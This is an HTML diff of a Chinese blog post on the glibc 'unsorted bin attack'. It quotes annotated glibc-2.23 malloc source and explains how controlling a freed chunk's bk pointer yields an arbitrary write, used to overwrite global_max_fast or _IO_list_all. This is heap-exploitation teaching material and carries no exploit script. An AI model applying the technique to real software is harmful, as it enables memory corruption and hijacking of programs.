-        <span class="site-state-item-name">分类</span></a>
-      </div>
-      <div class="site-state-item site-state-tags">
-          <a href="/tags/">
-        <span class="site-state-item-count">44</span>
-        <span class="site-state-item-name">标签</span></a>
-      </div>
-  </nav>
-</div>
-  <div class="links-of-author animated">
-      <span class="links-of-author-item">
-        <a href="https://github.com/Kylinxin" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Kylinxin" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
-      </span>
-  </div>
+		<div class="main-content-body transition-fade-up">
+			
 
-        </div>
-      </div>
-    </div>
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
 
+		<div class="article-title relative w-full">
+			
+			<div class="w-full flex items-center pt-6 justify-start">
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">unsorted bin</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] shrink-0 rounded-medium border border-border-color p-px">
+				<img src="/images/faction/1.png">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">Kylinxin</span>
+					
+					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Kylinxin</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2023-07-02 01:58:29</span>
+        <span class="mobile">2023-07-02 01:58:29</span>
+        <span class="hover-info">创建</span>
+    </span>
     
-  </aside>
-
-
-    </div>
-
-    <div class="main-inner post posts-expand">
-
-
-  
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://kylinxin.github.io/2023/07/02/unsorted%20bin%20attack/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/faction/1.png">
-      <meta itemprop="name" content="Kylinxin">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Kylinxin's Blog">
-      <meta itemprop="description" content="Kylinxin's Blog">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="unsorted bin | Kylinxin's Blog">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          unsorted bin
-        </h1>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2023-07-02 01:58:29" itemprop="dateCreated datePublished" datetime="2023-07-02T01:58:29+08:00">2023-07-02</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/heap/" itemprop="url" rel="index"><span itemprop="name">heap</span></a>
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2023-07-02 01:58:29</span>
+            <span class="mobile">2023-07-02 01:58:29</span>
+            <span class="hover-info">更新</span>
         </span>
-    </span>
+    
 
-  
-    <span class="post-meta-break"></span>
-    <span class="post-meta-item" title="本文字数">
-      <span class="post-meta-item-icon">
-        <i class="far fa-file-word"></i>
-      </span>
-      <span class="post-meta-item-text">本文字数：</span>
-      <span>13k</span>
-    </span>
-    <span class="post-meta-item" title="阅读时长">
-      <span class="post-meta-item-icon">
-        <i class="far fa-clock"></i>
-      </span>
-      <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>46 分钟</span>
-    </span>
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/heap/">heap</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/unsoted-bin-attack/">unsoted bin attack</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>4.3k 字</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>20 分钟</span>
+        </span>
+    
+    
 </div>
 
-        </div>
-      </header>
+				</div>
+			</div>
+		</div>
+		
 
-    
-    
-    
-    <div class="post-body" itemprop="articleBody"><h1 id="关于unsorted-bin-和-unsorted-bin-attack"><a href="#关于unsorted-bin-和-unsorted-bin-attack" class="headerlink" title="关于unsorted bin 和 unsorted bin attack"></a><strong>关于unsorted bin 和 unsorted bin attack</strong></h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>unsorted bin attack作为一种久远的攻击方式常常作为其他攻击方式的辅助手段，比如<strong>修改global_max_fast为一个较大的值使得几乎所有大小的chunk都用fast bin的管理方式进行分配和释放</strong>，又或者<strong>修改_IO_list_all来伪造_IO_FILE进行攻击</strong>。在上述攻击的利用过程中我们实际上并不需要对unsorted bin的分配过程有太多的了解。</p>
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<h1 id="关于unsorted-bin-和-unsorted-bin-attack"><a href="#关于unsorted-bin-和-unsorted-bin-attack" class="headerlink" title="关于unsorted bin 和 unsorted bin attack"></a><strong>关于unsorted bin 和 unsorted bin attack</strong></h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>unsorted bin attack作为一种久远的攻击方式常常作为其他攻击方式的辅助手段，比如<strong>修改global_max_fast为一个较大的值使得几乎所有大小的chunk都用fast bin的管理方式进行分配和释放</strong>，又或者<strong>修改_IO_list_all来伪造_IO_FILE进行攻击</strong>。在上述攻击的利用过程中我们实际上并不需要对unsorted bin的分配过程有太多的了解。</p>
 <blockquote>
 <p>global_max_fast是main_arena中控制最大fastbin大小的变量。</p>
 </blockquote>
@@ -303,70 +620,85 @@
 <h2 id="unsortedbin-源码分析"><a href="#unsortedbin-源码分析" class="headerlink" title="unsortedbin 源码分析"></a>unsortedbin 源码分析</h2><blockquote>
 <p>这里使用libc-2.23版本的源码<br>下面的源码不理解也没有关系（看看就好），这对利用unsortedbin这种攻击方式没有任何影响（）。<br>最重要的是最后的总结，记住就行了。</p>
 </blockquote>
-<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><code class="hljs c">#源码的第<span class="hljs-number">3470</span>行<span class="hljs-number">-3597</span>行<br>         <span class="hljs-keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))<br>		#取链表尾部的chunk记作victim<br>        &#123;<br>          bck = victim-&gt;bk;<br>          #倒数第二个chunk记作bck<br>          #接下来对victim的size位进行检查<br>          <span class="hljs-keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>)<br>              || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="hljs-number">0</span>))<br>            malloc_printerr (check_action, <span class="hljs-string">"malloc(): memory corruption"</span>,<br>                             chunk2mem (victim), av);<br>          size = chunksize (victim);<br>		  #检查通过，计算victim得到实际chunk的大小<br>          <span class="hljs-comment">/*</span><br><span class="hljs-comment">             If a small request, try to use last remainder if it is the</span><br><span class="hljs-comment">             only chunk in unsorted bin.  This helps promote locality for</span><br><span class="hljs-comment">             runs of consecutive small requests. This is the only</span><br><span class="hljs-comment">             exception to best-fit, and applies only when there is</span><br><span class="hljs-comment">             no exact fit for a small chunk.</span><br><span class="hljs-comment">           */</span><br><br>          <span class="hljs-keyword">if</span> (in_smallbin_range (nb) &amp;&amp;<br>              bck == unsorted_chunks (av) &amp;&amp;<br>              victim == av-&gt;last_remainder &amp;&amp;<br>              (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb + MINSIZE))<br>              #假如说我们申请的<span class="hljs-built_in">malloc</span>大小属于smallbin的范围，并且last_remainder是<br>              <span class="hljs-meta">#unsortedbin的唯一一个chunk时，优先使用这个chunk。</span><br>              <br>            &#123;<br>              #假若满足条件则对其进行切割和解链操作<br>              <br>              <span class="hljs-comment">/* split and reattach remainder */</span><br>              remainder_size = size - nb;<br>              remainder = chunk_at_offset (victim, nb);<br>              unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;<br>              av-&gt;last_remainder = remainder;<br>              remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);<br>              <span class="hljs-keyword">if</span> (!in_smallbin_range (remainder_size))<br>                &#123;<br>                  remainder-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>                  remainder-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>                &#125;<br><br>              set_head (victim, nb | PREV_INUSE |<br>                        (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>              set_head (remainder, remainder_size | PREV_INUSE);<br>              set_foot (remainder, remainder_size);<br><br>              check_malloced_chunk (av, victim, nb);<br>              <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>              alloc_perturb (p, bytes);<br>              <span class="hljs-keyword">return</span> p;<br>            &#125;<br>		  #如果上述条件不满足，则将victim从链中取出之后放到合适的链中或返回给用户。<br>          #其中unsorted_chunks (av)-&gt;bk = bck;<br>          <span class="hljs-meta">#bck-&gt;fd = unsorted_chunks (av);</span><br>          #是unsorted bin attack产生的原因，<br>          #一旦我们绕过之前的检查到达这里，<br>          #在可以控制victim-&gt;bk即bck的情况下我们可以往bck-&gt;fd写入unsorted_chunks(av)<br>          #即*(bck+<span class="hljs-number">0x10</span>)=unsorted(av)。<br>          <span class="hljs-comment">/* remove from unsorted list */</span><br>          <span class="hljs-meta">#unsortedbin产生的原因：</span><br>          unsorted_chunks (av)-&gt;bk = bck;<br>          bck-&gt;fd = unsorted_chunks (av);<br>		  #<br>          <span class="hljs-comment">/* Take now instead of binning if exact fit */</span><br>    	  #如果我们请求的nb同victim的大小恰好吻合，就直接返回这个块给用户。<br>          <span class="hljs-keyword">if</span> (size == nb)<br>            &#123;<br>              set_inuse_bit_at_offset (victim, size);<br>              <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>                victim-&gt;size |= NON_MAIN_ARENA;<br>              check_malloced_chunk (av, victim, nb);<br>              <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>              alloc_perturb (p, bytes);<br>              <span class="hljs-keyword">return</span> p;<br>            &#125;<br>                  <br>          <span class="hljs-comment">/* place chunk in bin */</span><br>		  #如果之前的条件都不满足，意味着目前的victim不能满足用户的需求，<br>          #需要根据其size放入small bin或large bin的链，<br>          #其中在后者实现中存在large bin attack，<br>          #由于同本文无关就不再进一步展开，最后是unlink将victim彻底解链。<br>          <span class="hljs-keyword">if</span> (in_smallbin_range (size))<br>            &#123;<br>              victim_index = smallbin_index (size);<br>              bck = bin_at (av, victim_index);<br>              fwd = bck-&gt;fd;<br>            &#125;<br>          <span class="hljs-keyword">else</span><br>            &#123;<br>              victim_index = largebin_index (size);<br>              bck = bin_at (av, victim_index);<br>              fwd = bck-&gt;fd;<br><br>              <span class="hljs-comment">/* maintain large bins in sorted order */</span><br>              <span class="hljs-keyword">if</span> (fwd != bck)<br>                &#123;<br>                  <span class="hljs-comment">/* Or with inuse bit to speed comparisons */</span><br>                  size |= PREV_INUSE;<br>                  <span class="hljs-comment">/* if smaller than smallest, bypass loop below */</span><br>                  assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                  <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &lt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (bck-&gt;bk-&gt;size))<br>                    &#123;<br>                      fwd = bck;<br>                      bck = bck-&gt;bk;<br><br>                      victim-&gt;fd_nextsize = fwd-&gt;fd;<br>                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;<br>                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>                    &#125;<br>                  <span class="hljs-keyword">else</span><br>                    &#123;<br>                      assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                      <span class="hljs-keyword">while</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size &lt; fwd-&gt;size)<br>                        &#123;<br>                          fwd = fwd-&gt;fd_nextsize;<br>                          assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                        &#125;<br><br>                      <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size == (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) fwd-&gt;size)<br>                        <span class="hljs-comment">/* Always insert in the second position.  */</span><br>                        fwd = fwd-&gt;fd;<br>                      <span class="hljs-keyword">else</span><br>                        &#123;<br>                          victim-&gt;fd_nextsize = fwd;<br>                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;<br>                          fwd-&gt;bk_nextsize = victim;<br>                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>                        &#125;<br>                      bck = fwd-&gt;bk;<br>                    &#125;<br>                &#125;<br>              <span class="hljs-keyword">else</span><br>                victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;<br>            &#125;<br><br>          mark_bin (av, victim_index);<br>          victim-&gt;bk = bck;<br>          victim-&gt;fd = fwd;<br>          fwd-&gt;bk = victim;<br>          bck-&gt;fd = victim;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_ITERS       10000</span><br>          <span class="hljs-keyword">if</span> (++iters &gt;= MAX_ITERS)<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br></code></pre></td></tr></tbody></table></figure>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><code class="hljs c">#源码的第<span class="hljs-number">3470</span>行<span class="hljs-number">-3597</span>行<br>         <span class="hljs-keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))<br>		#取链表尾部的chunk记作victim<br>        &#123;<br>          bck = victim-&gt;bk;<br>          #倒数第二个chunk记作bck<br>          #接下来对victim的size位进行检查<br>          <span class="hljs-keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>)<br>              || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="hljs-number">0</span>))<br>            malloc_printerr (check_action, <span class="hljs-string">"malloc(): memory corruption"</span>,<br>                             chunk2mem (victim), av);<br>          size = chunksize (victim);<br>		  #检查通过，计算victim得到实际chunk的大小<br>          <span class="hljs-comment">/*</span><br><span class="hljs-comment">             If a small request, try to use last remainder if it is the</span><br><span class="hljs-comment">             only chunk in unsorted bin.  This helps promote locality for</span><br><span class="hljs-comment">             runs of consecutive small requests. This is the only</span><br><span class="hljs-comment">             exception to best-fit, and applies only when there is</span><br><span class="hljs-comment">             no exact fit for a small chunk.</span><br><span class="hljs-comment">           */</span><br><br>          <span class="hljs-keyword">if</span> (in_smallbin_range (nb) &amp;&amp;<br>              bck == unsorted_chunks (av) &amp;&amp;<br>              victim == av-&gt;last_remainder &amp;&amp;<br>              (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb + MINSIZE))<br>              #假如说我们申请的<span class="hljs-built_in">malloc</span>大小属于smallbin的范围，并且last_remainder是<br>              <span class="hljs-meta">#unsortedbin的唯一一个chunk时，优先使用这个chunk。</span><br>              <br>            &#123;<br>              #假若满足条件则对其进行切割和解链操作<br>              <br>              <span class="hljs-comment">/* split and reattach remainder */</span><br>              remainder_size = size - nb;<br>              remainder = chunk_at_offset (victim, nb);<br>              unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;<br>              av-&gt;last_remainder = remainder;<br>              remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);<br>              <span class="hljs-keyword">if</span> (!in_smallbin_range (remainder_size))<br>                &#123;<br>                  remainder-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>                  remainder-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>                &#125;<br><br>              set_head (victim, nb | PREV_INUSE |<br>                        (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>              set_head (remainder, remainder_size | PREV_INUSE);<br>              set_foot (remainder, remainder_size);<br><br>              check_malloced_chunk (av, victim, nb);<br>              <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>              alloc_perturb (p, bytes);<br>              <span class="hljs-keyword">return</span> p;<br>            &#125;<br>		  #如果上述条件不满足，则将victim从链中取出之后放到合适的链中或返回给用户。<br>          #其中unsorted_chunks (av)-&gt;bk = bck;<br>          <span class="hljs-meta">#bck-&gt;fd = unsorted_chunks (av);</span><br>          #是unsorted bin attack产生的原因，<br>          #一旦我们绕过之前的检查到达这里，<br>          #在可以控制victim-&gt;bk即bck的情况下我们可以往bck-&gt;fd写入unsorted_chunks(av)<br>          #即*(bck+<span class="hljs-number">0x10</span>)=unsorted(av)。<br>          <span class="hljs-comment">/* remove from unsorted list */</span><br>          <span class="hljs-meta">#unsortedbin产生的原因：</span><br>          unsorted_chunks (av)-&gt;bk = bck;<br>          bck-&gt;fd = unsorted_chunks (av);<br>		  #<br>          <span class="hljs-comment">/* Take now instead of binning if exact fit */</span><br>    	  #如果我们请求的nb同victim的大小恰好吻合，就直接返回这个块给用户。<br>          <span class="hljs-keyword">if</span> (size == nb)<br>            &#123;<br>              set_inuse_bit_at_offset (victim, size);<br>              <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>                victim-&gt;size |= NON_MAIN_ARENA;<br>              check_malloced_chunk (av, victim, nb);<br>              <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>              alloc_perturb (p, bytes);<br>              <span class="hljs-keyword">return</span> p;<br>            &#125;<br>                  <br>          <span class="hljs-comment">/* place chunk in bin */</span><br>		  #如果之前的条件都不满足，意味着目前的victim不能满足用户的需求，<br>          #需要根据其size放入small bin或large bin的链，<br>          #其中在后者实现中存在large bin attack，<br>          #由于同本文无关就不再进一步展开，最后是unlink将victim彻底解链。<br>          <span class="hljs-keyword">if</span> (in_smallbin_range (size))<br>            &#123;<br>              victim_index = smallbin_index (size);<br>              bck = bin_at (av, victim_index);<br>              fwd = bck-&gt;fd;<br>            &#125;<br>          <span class="hljs-keyword">else</span><br>            &#123;<br>              victim_index = largebin_index (size);<br>              bck = bin_at (av, victim_index);<br>              fwd = bck-&gt;fd;<br><br>              <span class="hljs-comment">/* maintain large bins in sorted order */</span><br>              <span class="hljs-keyword">if</span> (fwd != bck)<br>                &#123;<br>                  <span class="hljs-comment">/* Or with inuse bit to speed comparisons */</span><br>                  size |= PREV_INUSE;<br>                  <span class="hljs-comment">/* if smaller than smallest, bypass loop below */</span><br>                  assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                  <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &lt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (bck-&gt;bk-&gt;size))<br>                    &#123;<br>                      fwd = bck;<br>                      bck = bck-&gt;bk;<br><br>                      victim-&gt;fd_nextsize = fwd-&gt;fd;<br>                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;<br>                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>                    &#125;<br>                  <span class="hljs-keyword">else</span><br>                    &#123;<br>                      assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                      <span class="hljs-keyword">while</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size &lt; fwd-&gt;size)<br>                        &#123;<br>                          fwd = fwd-&gt;fd_nextsize;<br>                          assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                        &#125;<br><br>                      <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size == (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) fwd-&gt;size)<br>                        <span class="hljs-comment">/* Always insert in the second position.  */</span><br>                        fwd = fwd-&gt;fd;<br>                      <span class="hljs-keyword">else</span><br>                        &#123;<br>                          victim-&gt;fd_nextsize = fwd;<br>                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;<br>                          fwd-&gt;bk_nextsize = victim;<br>                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>                        &#125;<br>                      bck = fwd-&gt;bk;<br>                    &#125;<br>                &#125;<br>              <span class="hljs-keyword">else</span><br>                victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;<br>            &#125;<br><br>          mark_bin (av, victim_index);<br>          victim-&gt;bk = bck;<br>          victim-&gt;fd = fwd;<br>          fwd-&gt;bk = victim;<br>          bck-&gt;fd = victim;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_ITERS       10000</span><br>          <span class="hljs-keyword">if</span> (++iters &gt;= MAX_ITERS)<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br></code></pre></td></tr></tbody></table></figure></div>
 
 <h2 id="unsortedbin-attack-原理"><a href="#unsortedbin-attack-原理" class="headerlink" title="unsortedbin_attack 原理"></a>unsortedbin_attack 原理</h2><p>从下面的源码中可以看到，当将一个unsortedbin取出时，会将bck-&gt;fd的位置写入本unsortedbin的位置</p>
-<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#glibc-2.23/malloc/malloc.c</span><br><span class="hljs-comment">#源码第3515-3517行</span><br>		  /* remove <span class="hljs-keyword">from</span> unsorted <span class="hljs-built_in">list</span> */<br>          unsorted_chunks (av)-&gt;bk = bck;<br>          bck-&gt;fd = unsorted_chunks (av);<br>//unsorted_chunks(av)其实是&amp;main_arena.top<br></code></pre></td></tr></tbody></table></figure>
